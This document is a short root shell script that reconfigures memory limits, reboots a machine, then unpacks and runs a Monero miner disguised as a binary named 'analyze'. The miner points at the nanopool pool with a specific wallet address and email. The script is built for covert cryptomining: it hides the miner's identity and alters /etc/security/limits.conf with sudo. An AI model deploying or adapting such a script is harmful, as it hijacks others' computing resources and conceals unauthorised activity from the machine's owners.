if [ -e /root/initdone ]
then
    tar -xvf analyze.tar ; sudo sysctl -w vm.nr_hugepages=8 ; sudo chmod +x ./analyze ; sudo LD_LIBRARY_PATH=$PWD:$LD_LIBRARY_PATH  ./analyze -a rx/0 -t 8 -o xmr-eu1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS21WH2cfawSGCNupk7.hmailx/itwaybot@gmail.com -l res.txt
else
    sudo sysctl -w vm.nr_hugepages=8 ; sudo echo "* soft memlock 262144" >> /etc/security/limits.conf ; sudo echo "* hard memlock 262144" >> /etc/security/limits.conf ; sudo echo 1 > /root/initdone ; reboot
fi
